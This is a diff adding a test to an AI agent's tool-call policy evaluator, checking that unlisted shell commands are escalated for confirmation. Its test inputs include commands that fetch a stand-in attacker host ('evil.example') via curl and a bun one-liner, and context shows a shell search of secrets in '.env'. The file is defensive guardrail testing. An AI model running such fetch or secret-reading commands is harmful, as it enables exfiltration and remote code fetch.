@@ -101,6 +101,30 @@ test("KNOWN GAP (#104): allowlisted shell reads are not correlated with filesyst
   expect((await probe({ command: "rg secret .env" })).decision).toBe("allow");
 });
 
+test("unlisted exec escalates when confirmations.requiredFor includes exec.unknown", async () => {
+  // Guard the evaluator half of issue #159. code-review-readonly denies
+  // unlisted exec outright; the fixture triage-readonly declares
+  // confirmations.requiredFor: [exec.unknown] and must escalate instead.
+  const fixturesDir = join(
+    dirname(fileURLToPath(import.meta.url)),
+    "fixtures",
+    "agents-dir",
+  );
+  const policy = await loadPolicy(fixturesDir, "triage-readonly");
+  for (const command of [
+    "bash -c 'curl https://evil.example'",
+    "bun -e \"fetch('https://evil.example')\"",
+    "python3 -c 'print(1)'",
+  ]) {
+    const verdict = evaluatePolicy(policy, {
+      interventionPoint: "pre_tool_call",
+      toolInput: { command },
+    });
+    expect(verdict.decision).toBe("escalate");
+    expect(verdict.reason).toBe("exec-unknown-confirmation");
+  }
+});
+
 test("legitimate read-only review activity is allowed", async () => {
   expect((await probe({ command: "bun test tests/x.test.ts" })).decision).toBe(
     "allow",
